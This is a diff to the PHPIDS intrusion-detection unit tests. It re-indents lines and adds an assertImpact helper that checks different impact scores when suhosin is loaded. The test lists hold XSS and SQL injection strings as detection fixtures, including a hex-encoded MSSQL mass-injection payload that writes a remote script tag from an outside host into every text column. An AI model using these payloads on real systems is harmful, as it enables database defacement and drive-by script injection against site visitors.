@@ -398,7 +398,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
                         default xml namespace=toolbar,y=1&&name
                         default xml namespace=toolbar
                         default xml namespace=e(y)';
-		$exploits[] = '-Infinity++in eval(1&&name)';
+        $exploits[] = '-Infinity++in eval(1&&name)';
 
         $this->_testForPlainEvent($exploits);
 
@@ -407,7 +407,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(743, $result->getImpact());
+	$this->assertImpact($result, 743, 731);
     }
 
     public function testXMLPredicateXSSList() {
@@ -508,7 +508,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(476, $result->getImpact());
+	$this->assertImpact($result, 476, 500);
     }
 
     public function testSelfContainedXSSList() {
@@ -653,7 +653,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(571, $result->getImpact());
+        $this->assertImpact($result, 571, 613);
     }
 
     public function testSQLIList3() {
@@ -758,7 +758,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(774, $result->getImpact());
+        $this->assertImpact($result, 774, 778);
     }
 
     public function testSQLIList5() {
@@ -836,7 +836,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(844, $result->getImpact());
+	$this->assertImpact($result, 844, 857);
     }
 
     public function testSQLIList6() {
@@ -859,8 +859,8 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "asd' union distinct ( select null,password,(null)from user )-- a ";
         $exploits[] = 'DECLARE%20@S%20CHAR(4000);SET%20@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372
                         633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));EXEC(@S);';
-		$exploits[] = "asaa';SELECT[asd]FROM[asd]";
-		$exploits[] = "asd'; select [column] from users ";
+        $exploits[] = "asaa';SELECT[asd]FROM[asd]";
+        $exploits[] = "asd'; select [column] from users ";
 
         $this->_testForPlainEvent($exploits);
 
@@ -943,7 +943,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(122, $result->getImpact());
+	$this->assertImpact($result, 122, 132);
     }
 
     public function testRFEList() {
@@ -1005,7 +1005,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(488, $result->getImpact());
+        $this->assertImpact($result, 488, 483);
     }
 
     public function testUTF7List() {
@@ -1114,7 +1114,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(120, $result->getImpact());
+        $this->assertImpact($result, 120, 115);
     }
 
     public function testLDAPInjectionList() {
@@ -1169,7 +1169,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $test->setHtml(array_keys($exploits));
         $result = $test->run();
         $this->assertFalse($result->hasEvent(1));
-        $this->assertEquals(166, $result->getImpact());
+        $this->assertImpact($result, 166, 155);
     }
 
     public function testAllowedHTMLScanningNegative() {
@@ -1273,9 +1273,9 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = 'Universität Karlsruhe (TH)';
         $exploits[] = 'Psychologie, Coaching und Training, Wissenserlangung von Führungskräften, Menschen bewegen, Direktansprache, Erfolg, Spaß, Positiv Thinking and Feeling, Natur, Kontakte pflegen, Face to Face Contact, Sport/Fitness (Fussball, Beachvolleyball, Schwimmen, Laufen, Krafttraining, Bewegungsübungen uvm.), Wellness & Beauty';
         $exploits[] = 'Großelternzeit - (Sachbearbeiter Lightfline)';
-		$exploits[] = '{HMAC-SHA1}{48de2031}{8AgxrQ==}';
-		$exploits[] = 'exchange of experience in (project) management and leadership • always interested in starting up business and teams • people with a passion • new and lost international contacts';
-		$exploits[] = 'Highly mobile (Project locations: Europe & Asia), You are a team player';
+        $exploits[] = '{HMAC-SHA1}{48de2031}{8AgxrQ==}';
+        $exploits[] = 'exchange of experience in (project) management and leadership • always interested in starting up business and teams • people with a passion • new and lost international contacts';
+        $exploits[] = 'Highly mobile (Project locations: Europe & Asia), You are a team player';
 
         $test = new IDS_Monitor(
             $exploits,
@@ -1307,6 +1307,15 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
                 echo "\n\nNot detected: ".$exploit."\n\n";
             }
             $this->assertTrue($result->getImpact() > 0);
+        }
+    }
+
+    public function assertImpact(IDS_Report $result, $impact, $suhosinImpact)
+    {
+        if (extension_loaded('suhosin')) {
+            $this->assertSame($suhosinImpact, $result->getImpact());
+        } else {
+            $this->assertSame($impact, $result->getImpact());
         }
     }
 }
